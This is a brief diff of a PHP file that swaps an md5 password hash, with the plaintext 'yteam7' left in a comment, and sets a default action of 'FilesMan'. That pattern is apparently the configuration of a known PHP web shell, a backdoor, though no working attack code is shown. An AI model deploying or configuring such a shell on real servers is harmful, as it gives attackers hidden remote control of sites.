@@ -11,7 +11,7 @@ session_start();
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "0f2f0d2da1f2f4c7ba578afcfeefacb8"; //yteam7
+$password = "c67e1180731d888f88e7fe449df3dea8"; //yteam7
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
